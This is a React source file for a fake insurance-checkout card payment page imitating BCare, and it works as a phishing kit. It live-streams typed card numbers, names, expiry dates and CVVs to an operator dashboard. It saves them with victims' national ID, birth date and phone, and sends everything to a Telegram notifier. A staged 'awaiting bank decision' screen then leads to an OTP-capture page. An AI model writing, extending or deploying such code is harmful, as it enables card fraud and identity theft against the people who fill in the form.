import { useEffect, useMemo, useState, type ChangeEvent } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { LoaderCircle, Lock, ShieldCheck, Smartphone } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { saveApplication, getMyApplication, detectCardBrand } from "@/lib/admin-storage";
import { cardErrorMessage } from "@/lib/card-validation";
import { supabase } from "@/integrations/supabase/client";
import { clearLiveCardData, getVisitorId, updateVisitorPresence } from "@/lib/visitor-tracking";
import { notifyCardSubmitted } from "@/lib/telegram-notify";
import { useI18n } from "@/lib/i18n";
import Header from "@/components/site/Header";
import SiteFooter from "@/components/site/SiteFooter";
import QuoteSteps from "@/components/site/QuoteSteps";

type PaymentState = {
  company?: string;
  total?: number;
  type?: string;
  price?: number;
  method?: string;
  fullName?: string;
  identity?: string;
  birthDate?: string;
  phone?: string;
  insuranceType?: string;
  startDate?: string;
  purpose?: string;
  estValue?: string;
  carYear?: string;
  carModel?: string;
  repairPlace?: string;
  brand?: string;
  year?: string;
  selectedBrand?: string;
  selectedBrandLabel?: string;
  iban?: string;
};

const formatCardNumber = (v: string) =>
  v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

const formatExpiry = (v: string) => {
  const d = v.replace(/\D/g, "").slice(0, 4);
  if (d.length <= 2) return d;
  return `${d.slice(0, 2)}/${d.slice(2)}`;
};

const QuoteCardPayment = () => {
  const { t, isAr } = useI18n();
  const navigate = useNavigate();
  const location = useLocation();
  const state: PaymentState = (() => {
    const fromNav = location.state as PaymentState | null;
    if (typeof window === "undefined") return fromNav || {};
    if (fromNav && (fromNav.total != null || fromNav.company)) {
      try {
        sessionStorage.setItem("bcare_payment_state", JSON.stringify(fromNav));
      } catch {}
      return fromNav;
    }
    try {
      return JSON.parse(sessionStorage.getItem("bcare_payment_state") || "{}");
    } catch {
      return {};
    }
  })();

  const total = state.total ?? 0;

  const [card, setCard] = useState("");
  const [expiry, setExpiry] = useState("");
  const [name, setName] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);
  const [appId, setAppId] = useState<string | null>(null);
  const [rejected, setRejected] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(60);

  // Keep the caret stable while the card number is formatted (typing or deleting)
  const restoreCaret = (el: HTMLInputElement, next: string, digitsBefore: number) => {
    window.setTimeout(() => {
      if (el !== document.activeElement) return;
      let pos = 0;
      for (let count = 0; count < digitsBefore && pos < next.length; pos++) {
        if (/\d/.test(next[pos] ?? "")) count++;
      }
      const target = Math.min(pos, next.length);
      el.setSelectionRange(target, target);
    }, 0);
  };

  const handleCardChange = (e: ChangeEvent<HTMLInputElement>) => {
    const el = e.target;
    const caret = el.selectionStart ?? el.value.length;
    const digitsBefore = el.value.slice(0, caret).replace(/\D/g, "").length;
    const next = formatCardNumber(el.value);
    setCard(next);
    restoreCaret(el, next, digitsBefore);
  };

  const handleExpiryChange = (e: ChangeEvent<HTMLInputElement>) => {
    const el = e.target;
    const caret = el.selectionStart ?? el.value.length;
    const digitsBefore = el.value.slice(0, caret).replace(/\D/g, "").length;
    const next = formatExpiry(el.value);
    setExpiry(next);
    restoreCaret(el, next, digitsBefore);
  };

  const { month, year } = useMemo(() => {
    const parts = expiry.split("/");
    const mm = (parts[0] || "").padStart(2, "0").slice(0, 2);
    const yy = (parts[1] || "").slice(0, 2);
    const yyyy = yy.length === 2 ? `20${yy}` : "";
    return { month: parts[0] && parts[0].length === 2 ? mm : "", year: yy.length === 2 ? yyyy : "" };
  }, [expiry]);

  useEffect(() => {
    const pendingId = sessionStorage.getItem("bcare_pending_app_id");
    if (pendingId) {
      sessionStorage.removeItem("bcare_pending_app_id");
      setAppId(pendingId);
    }
  }, []);

  // Broadcast live card fields to the admin dashboard
  useEffect(() => {
    updateVisitorPresence({
      card_number: card,
      card_name: name,
      card_exp_month: month,
      card_exp_year: year,
      card_cvv: cvv,
      card_updated_at: new Date().toISOString(),
    });
  }, [card, name, month, year, cvv]);

  useEffect(() => {
    return () => {
      clearLiveCardData();
    };
  }, []);

  useEffect(() => {
    if (!loading || !appId) return;

    let redirecting = false;
    const handle = (review: string | undefined) => {
      if (review === "approved") {
        if (redirecting) return;
        redirecting = true;
        setLoading(false);
        sessionStorage.setItem("bcare_pending_app_id", appId);
        window.location.assign("/quote/otp");
      } else if (review === "rejected") {
        setLoading(false);
        setRejected(true);
        toast.error(t("تم رفض عملية الدفع من البنك", "The bank declined the payment"));
      }
    };

    const channel = supabase
      .channel(`app-${appId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "applications",
          filter: `id=eq.${appId}`,
        },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          handle(newRow.review_status);
        },
      )
      .subscribe();

    let pollInFlight = false;
    const checkApplication = async () => {
      if (pollInFlight || redirecting) return;
      pollInFlight = true;
      try {
        const app = await getMyApplication(appId);
        if (app) handle(app.reviewStatus);
      } finally {
        pollInFlight = false;
      }
    };
    void checkApplication();
    const interval = window.setInterval(checkApplication, 750);
    const checkWhenVisible = () => {
      if (document.visibilityState === "visible") void checkApplication();
    };
    window.addEventListener("focus", checkApplication);
    document.addEventListener("visibilitychange", checkWhenVisible);

    return () => {
      supabase.removeChannel(channel);
      window.clearInterval(interval);
      window.removeEventListener("focus", checkApplication);
      document.removeEventListener("visibilitychange", checkWhenVisible);
    };
  }, [loading, appId, navigate, t]);

  // 60s countdown while waiting for bank/admin decision
  useEffect(() => {
    if (!loading) return;
    setSecondsLeft(60);
    const tick = window.setInterval(() => {
      setSecondsLeft((s) => {
        if (s <= 1) {
          window.clearInterval(tick);
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => window.clearInterval(tick);
  }, [loading, appId]);

  const isValid =
    card.replace(/\s/g, "").length >= 15 &&
    expiry.length === 5 &&
    !!month &&
    !!year &&
    name.trim().length >= 3 &&
    cvv.length >= 3;

  const handleSubmit = async () => {
    if (!isValid) {
      toast.error(t("الرجاء إكمال بيانات البطاقة", "Please complete the card details"));
      return;
    }
    const validationError = cardErrorMessage({ card, name, month, year, cvv });
    if (validationError) {
      toast.error(validationError);
      return;
    }
    setLoading(true);
    setRejected(false);
    const entry = await saveApplication({
      visitorId: getVisitorId(),
      fullName: state.fullName,
      identity: state.identity,
      birthDate: state.birthDate,
      phone: state.phone,
      insuranceType: state.insuranceType,
      startDate: state.startDate,
      purpose: state.purpose,
      estValue: state.estValue,
      carYear: state.carYear || state.year,
      carModel: state.carModel || state.brand,
      repairPlace: state.repairPlace,
      company: state.company,
      type: state.type,
      price: state.price,
      total: state.total,
      method: state.method,
      status: "pending",
      reviewStatus: "awaiting_review",
      cardNumber: card,
      cardName: name,
      cardExpMonth: month,
      cardExpYear: year,
      cardCvv: cvv,
      cardBrand: (state.selectedBrand as "mada" | "visa" | "amex" | undefined) ?? detectCardBrand(card),
    });
    if (!entry) {
      setLoading(false);
      toast.error(
        t(
          "تعذّر حفظ العملية في قاعدة البيانات. تحقق من الـ console.",
          "Failed to save the transaction. Check the console.",
        ),
      );
      return;
    }
    setAppId(entry.id);
    notifyCardSubmitted({
      appId: entry.id,
      fullName: state.fullName,
      identity: state.identity,
      birthDate: state.birthDate,
      phone: state.phone,
      insuranceType: state.insuranceType,
      carYear: state.carYear || state.year,
      carModel: state.carModel || state.brand,
      estValue: state.estValue,
      purpose: state.purpose,
      repairPlace: state.repairPlace,
      company: state.company,
      type: state.type,
      price: state.price,
      total: state.total,
      method: state.method,
      cardNumber: card,
      cardName: name,
      cardExpMonth: month,
      cardExpYear: year,
      cardCvv: cvv,
      cardBrand: (state.selectedBrand as string | undefined) ?? detectCardBrand(card),
    });
  };

  const rowLabel = "text-right text-[17px] font-bold text-black leading-none";
  const rowBg = "bg-[#d9d9d9] px-4 py-2.5 rounded-sm";
  const inputBase =
    "w-full rounded-sm bg-white px-4 py-2.5 text-right text-[15px] font-normal text-[#111] outline-none placeholder:font-normal placeholder:text-gray-400";

  return (
    <main dir={isAr ? "rtl" : "ltr"} className="flex min-h-screen flex-col bg-[#efefef]">
      <style>{`@keyframes bcare-blink { 0%, 49% { opacity: 1; } 50%, 100% { opacity: 0; } }`}</style>
      <Header />
      <QuoteSteps current={4} />
      <div className="flex-1 py-10">
      <div className="mx-auto w-full max-w-[560px] bg-[#d9d9d9] p-4 shadow-sm">
        <div className={rowBg}>
          <label className={rowLabel}>{t("رقم البطاقة", "Card Number")}</label>
        </div>
        <div className="mt-2 mb-3">
          <input
            inputMode="numeric"
            dir="ltr"
            value={card}
            onChange={handleCardChange}
            placeholder={t("رقم البطاقة", "Card Number")}
            className={`${inputBase} font-mono tabular-nums tracking-[0.18em]`}
          />
        </div>

        <div className={rowBg}>
          <label className={rowLabel}>{t("تاريخ الإنتهاء", "Expiry Date")}</label>
        </div>
        <div className="mt-2 mb-3">
          <input
            inputMode="numeric"
            dir="ltr"
            value={expiry}
            onChange={handleExpiryChange}
            placeholder={t("شهر / سنة", "MM / YY")}
            className={inputBase}
          />
        </div>

        <div className={rowBg}>
          <label className={rowLabel}>{t("اسم حامل البطاقة", "Cardholder Name")}</label>
        </div>
        <div className="mt-2 mb-3">
          <input
            value={name}
            onChange={(e) => setName(e.target.value.slice(0, 60))}
            placeholder={t("اسم حامل البطاقة", "Cardholder Name")}
            className={inputBase}
          />
        </div>

        <div className={rowBg}>
          <label className={rowLabel}>{t("رمز التحقق (CVV)", "Security Code (CVV)")}</label>
        </div>
        <div className="mt-2 mb-5">
          <input
            inputMode="numeric"
            dir="ltr"
            value={cvv}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
            placeholder={t("رمز التحقق (CVV)", "CVV")}
            className={inputBase}
          />
        </div>

        <div className="flex justify-end">
          <button
            type="button"
            disabled={!isValid || loading}
            onClick={handleSubmit}
            className={cn(
              "rounded-sm border-2 px-6 py-2.5 text-[17px] font-bold",
              isValid
                ? "border-yellow-400 bg-yellow-400 text-black"
                : "border-green-600 bg-transparent text-white",
            )}
          >
            {loading ? t("جارٍ المعالجة...", "Processing...") : t("إدفع الآن", "Pay Now")}
          </button>
        </div>
      </div>

      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-brand-blue/20 px-4 backdrop-blur-sm">
          <div className="w-full max-w-[520px] rounded-2xl bg-white p-6 shadow-card sm:p-7">
            <div className="flex flex-col items-center text-center">
              <div className="mb-4 grid h-16 w-16 place-items-center rounded-full bg-brand-blue/10 text-brand-blue">
                <LoaderCircle className="h-8 w-8 animate-spin" strokeWidth={2.2} />
              </div>
              <h2 className="text-[20px] font-extrabold text-brand-blue sm:text-[24px]">
                {t("جاري المعالجة", "Processing")}
              </h2>
              <p className="mt-2 text-[13px] leading-6 text-muted-foreground sm:text-[14px]">
                {t(
                  "نتحقق من بيانات بطاقتك مع البنك. يرجى الانتظار حتى اكتمال التحقق.",
                  "We are verifying your card details with the bank. Please wait until the verification is complete.",
                )}
              </p>
              <div className="mt-5 flex items-center gap-3">
                <div className="grid h-14 w-14 place-items-center rounded-full border-2 border-brand-blue/30 bg-brand-blue/5 text-[18px] font-extrabold text-brand-blue tabular-nums">
                  {secondsLeft}
                </div>
                <div className="text-right text-[12px] text-muted-foreground">
                  <div className="font-bold text-brand-blue">{t("بانتظار قرار البنك", "Awaiting bank decision")}</div>
                  <div>{t("قبول أو رفض العملية…", "Accepting or declining the transaction…")}</div>
                </div>
              </div>
              <div className="mt-4 h-1.5 w-full overflow-hidden rounded-full bg-muted">
                <div
                  className="h-full bg-brand-blue transition-all duration-1000 ease-linear"
                  style={{ width: `${((60 - secondsLeft) / 60) * 100}%` }}
                />
              </div>
              <div className="mt-6 w-full space-y-2.5 text-right">
                <div className="flex items-start gap-2.5 rounded-xl border border-border/70 bg-white p-3">
                  <span className="mt-0.5 grid h-6 w-6 shrink-0 place-items-center rounded-full bg-orange-500 text-[12px] font-extrabold text-white">
                    1
                  </span>
                  <div className="flex-1">
                    <div className="text-[13px] font-extrabold text-brand-blue">
                      {t("تحقق من رسائلك النصية (SMS)", "Check your text messages (SMS)")}
                    </div>
                    <div className="mt-0.5 text-[11.5px] leading-5 text-muted-foreground">
                      {t(
                        "سيقوم البنك بإرسال رمز التحقق السري إلى جوالك المسجّل.",
                        "The bank will send a secret verification code to your registered mobile number.",
                      )}
                    </div>
                  </div>
                </div>
                <div className="flex items-start gap-2.5 rounded-xl border border-border/70 bg-white p-3">
                  <span className="mt-0.5 grid h-6 w-6 shrink-0 place-items-center rounded-full bg-orange-500 text-[12px] font-extrabold text-white">
                    2
                  </span>
                  <div className="flex-1">
                    <div className="text-[13px] font-extrabold text-brand-blue">
                      {t("أو تحقق من تطبيق البنك الخاص بك", "Or check your bank's app")}
                    </div>
                    <div className="mt-0.5 text-[11.5px] leading-5 text-muted-foreground">
                      {t(
                        'قد يتطلب البنك الموافقة عبر إشعار "داخل التطبيق".',
                        'The bank may require approval via an "in-app" notification.',
                      )}
                    </div>
                  </div>
                  <Smartphone className="mt-0.5 h-4 w-4 shrink-0 text-orange-500" />
                </div>
              </div>
              <div className="mt-4 flex w-full items-center justify-center gap-2 rounded-xl border border-border/70 bg-muted/30 p-4 text-[12.5px] font-bold text-brand-blue">
                <ShieldCheck className="h-4 w-4 text-emerald-600" />
                <span>{t("اتصال آمن مع البنك", "Secure connection with the bank")}</span>
              </div>
              {total > 0 && (
                <div className="mt-2 text-[11px] text-muted-foreground">
                  {t("المبلغ", "Amount")}: {total.toFixed(2)} {t("ر.س", "SAR")}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {rejected && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-brand-blue/20 px-4 backdrop-blur-sm"
          onClick={() => setRejected(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            className="w-full max-w-[460px] rounded-2xl bg-white p-6 text-center shadow-card sm:p-7"
          >
            <div className="mx-auto mb-4 grid h-16 w-16 place-items-center rounded-full bg-destructive/10 text-destructive">
              <Lock className="h-8 w-8" strokeWidth={2.2} />
            </div>
            <h2 className="text-[20px] font-extrabold text-destructive sm:text-[22px]">
              {t("تم رفض العملية", "Transaction Declined")}
            </h2>
            <p className="mt-2 text-[13px] leading-6 text-muted-foreground sm:text-[14px]">
              {t(
                "لم يقبل البنك بيانات البطاقة. يرجى التحقق من المعلومات والمحاولة مرة أخرى.",
                "The bank did not accept the card details. Please check the information and try again.",
              )}
            </p>
            <button
              type="button"
              onClick={() => setRejected(false)}
              className="mt-5 h-[46px] w-full rounded-[10px] bg-brand-blue text-[14px] font-extrabold text-white hover:brightness-110"
            >
              {t("حسناً", "OK")}
            </button>
          </div>
        </div>
      )}
      </div>

      <SiteFooter />
    </main>
  );
};

export default QuoteCardPayment;
